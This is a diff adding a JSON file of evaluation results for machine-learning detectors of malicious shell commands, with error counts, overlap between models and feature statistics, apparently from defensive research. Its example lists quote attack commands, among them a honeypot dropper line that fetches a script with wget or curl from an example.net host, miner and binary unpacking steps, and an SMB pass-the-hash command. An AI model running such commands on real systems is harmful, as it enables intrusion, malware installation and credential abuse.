@@ -1,0 +1,290 @@
+{
+  "dataset1": {
+    "n_test": 3049,
+    "n_attack": 762,
+    "n_benign": 2287,
+    "counts": {
+      "random_forest": {
+        "fn": 207,
+        "fp": 77
+      },
+      "isolation_forest": {
+        "fn": 651,
+        "fp": 18
+      },
+      "xgboost_hybrid": {
+        "fn": 94,
+        "fp": 95
+      }
+    },
+    "rf_vs_if": {
+      "fn_overlap": 207,
+      "fn_jaccard": 0.318,
+      "fn_rf_only": 0,
+      "fn_if_only": 444,
+      "fp_overlap": 5,
+      "fp_jaccard": 0.056,
+      "fp_rf_only": 72,
+      "fp_if_only": 13,
+      "if_fp_sources": {
+        "nl2bash": 8,
+        "bash6k": 7,
+        "tldr": 2,
+        "linlm": 1
+      },
+      "rf_fp_sources": {
+        "nl2bash": 24,
+        "tldr": 19,
+        "linlm": 18,
+        "bash6k": 14,
+        "bash_instruct": 2
+      }
+    },
+    "cascade_premise": {
+      "rf_fn": 207,
+      "recovered_by_hybrid": 123,
+      "recovery_rate": 0.594,
+      "missed_by_both": 84,
+      "hybrid_only_fn": 10,
+      "recovered_sources": {
+        "hacktricks": 58,
+        "gtfobins": 35,
+        "atomic_red_team": 26,
+        "payloads": 3,
+        "slp": 1
+      },
+      "missed_by_both_sources": {
+        "hacktricks": 53,
+        "gtfobins": 17,
+        "atomic_red_team": 13,
+        "slp": 1
+      },
+      "examples_recovered": [
+        "var port=12345;",
+        "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP",
+        "mount | grep cgroup",
+        "restic --password-command='/path/to/command' backup",
+        "nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H \"HashPlaceholder\" -d \"YourDOMAIN\"",
+        "yarn --cwd .",
+        "get_version \"/\\S+/srm/bin/vmware-dr($|\\s)\" --version",
+        "cap_net_raw user1"
+      ],
+      "examples_missed_by_both": [
+        "bconsole",
+        "apparmor_parser",
+        "aptitude changelog aptitude",
+        "rm $1*.bin",
+        "Label=unconfined",
+        "sudo pkill -SIGTERM ^cron$",
+        "zip $HOME/data.zip /var/log/{w,b}tmp",
+        "Slice=system.slice"
+      ]
+    },
+    "rf_fn_signature": {
+      "most_benign_looking_features": [
+        {
+          "feature": "special_ratio",
+          "missed": 0.1384,
+          "caught": 0.2027,
+          "benign": 0.1425,
+          "z_missed_vs_caught": -0.837
+        },
+        {
+          "feature": "n_abs_paths",
+          "missed": 0.1304,
+          "caught": 0.8505,
+          "benign": 0.0909,
+          "z_missed_vs_caught": -0.827
+        },
+        {
+          "feature": "has_shell_bin",
+          "missed": 0.0,
+          "caught": 0.3045,
+          "benign": 0.0079,
+          "z_missed_vs_caught": -0.662
+        },
+        {
+          "feature": "n_redirect_out",
+          "missed": 0.0483,
+          "caught": 0.391,
+          "benign": 0.0582,
+          "z_missed_vs_caught": -0.549
+        },
+        {
+          "feature": "max_token_len",
+          "missed": 11.5507,
+          "caught": 17.7604,
+          "benign": 11.6847,
+          "z_missed_vs_caught": -0.462
+        },
+        {
+          "feature": "has_dev_null",
+          "missed": 0.0048,
+          "caught": 0.182,
+          "benign": 0.0039,
+          "z_missed_vs_caught": -0.459
+        },
+        {
+          "feature": "n_sensitive_paths",
+          "missed": 0.029,
+          "caught": 0.3387,
+          "benign": 0.0179,
+          "z_missed_vs_caught": -0.452
+        },
+        {
+          "feature": "digit_ratio",
+          "missed": 0.0303,
+          "caught": 0.0802,
+          "benign": 0.0208,
+          "z_missed_vs_caught": -0.398
+        }
+      ],
+      "mean_len_chars": {
+        "missed": 38.6,
+        "caught": 57.2,
+        "benign": 37.3
+      },
+      "missed_str_in_benign_train": 0,
+      "missed_str_in_attack_train": 0,
+      "n_missed": 207
+    }
+  },
+  "dataset2": {
+    "n_test": 1915,
+    "n_attack": 479,
+    "n_benign": 1436,
+    "counts": {
+      "random_forest": {
+        "fn": 145,
+        "fp": 74
+      },
+      "isolation_forest": {
+        "fn": 441,
+        "fp": 14
+      },
+      "xgboost_hybrid": {
+        "fn": 74,
+        "fp": 71
+      }
+    },
+    "rf_vs_if": {
+      "fn_overlap": 137,
+      "fn_jaccard": 0.305,
+      "fn_rf_only": 8,
+      "fn_if_only": 304,
+      "fp_overlap": 1,
+      "fp_jaccard": 0.011,
+      "fp_rf_only": 73,
+      "fp_if_only": 13,
+      "if_fp_sources": {
+        "commandlinefu": 12,
+        "bash_history": 2
+      },
+      "rf_fp_sources": {
+        "bash_history": 61,
+        "commandlinefu": 13
+      }
+    },
+    "cascade_premise": {
+      "rf_fn": 145,
+      "recovered_by_hybrid": 83,
+      "recovery_rate": 0.572,
+      "missed_by_both": 62,
+      "hybrid_only_fn": 12,
+      "recovered_sources": {
+        "honeypot": 83
+      },
+      "missed_by_both_sources": {
+        "honeypot": 62
+      },
+      "examples_recovered": [
+        "echo \"cd /tmp ; wget http://h060a0744.example.net/wget.sh || curl http://h060a0744.example",
+        "unzip nasa.zip",
+        "nproo",
+        "tar xvf miner.tar",
+        "chmod +x sshdsservers",
+        "head -v -n 8 /proc/meminfo",
+        "chmod u+x syn2023",
+        "tar xzvf m,ix.tgz"
+      ],
+      "examples_missed_by_both": [
+        "nano u.txt",
+        "31m>>>> Server Gasit incepem Testele \\033[1",
+        "cat tmp.rwG6eULB7M.sh",
+        "ls -1 /etc/pam.d",
+        "xz",
+        "rm -rf read.txt*",
+        "pkill -f cyber",
+        "distance"
+      ]
+    },
+    "rf_fn_signature": {
+      "most_benign_looking_features": [
+        {
+          "feature": "has_fetch_bin",
+          "missed": 0.0345,
+          "caught": 0.2545,
+          "benign": 0.0299,
+          "z_missed_vs_caught": -0.505
+        },
+        {
+          "feature": "digit_ratio",
+          "missed": 0.0492,
+          "caught": 0.1027,
+          "benign": 0.032,
+          "z_missed_vs_caught": -0.451
+        },
+        {
+          "feature": "has_hidden_path",
+          "missed": 0.0414,
+          "caught": 0.1946,
+          "benign": 0.0397,
+          "z_missed_vs_caught": -0.387
+        },
+        {
+          "feature": "has_url",
+          "missed": 0.0345,
+          "caught": 0.1647,
+          "benign": 0.0195,
+          "z_missed_vs_caught": -0.351
+        },
+        {
+          "feature": "special_ratio",
+          "missed": 0.1337,
+          "caught": 0.157,
+          "benign": 0.1415,
+          "z_missed_vs_caught": -0.282
+        },
+        {
+          "feature": "head_is_shell",
+          "missed": 0.0069,
+          "caught": 0.0749,
+          "benign": 0.0063,
+          "z_missed_vs_caught": -0.258
+        },
+        {
+          "feature": "has_ipv4",
+          "missed": 0.0069,
+          "caught": 0.0719,
+          "benign": 0.0118,
+          "z_missed_vs_caught": -0.252
+        },
+        {
+          "feature": "has_hex_escape",
+          "missed": 0.0,
+          "caught": 0.0509,
+          "benign": 0.0021,
+          "z_missed_vs_caught": -0.232
+        }
+      ],
+      "mean_len_chars": {
+        "missed": 52.7,
+        "caught": 46.5,
+        "benign": 38.9
+      },
+      "missed_str_in_benign_train": 0,
+      "missed_str_in_attack_train": 0,
+      "n_missed": 145
+    }
+  }
+}
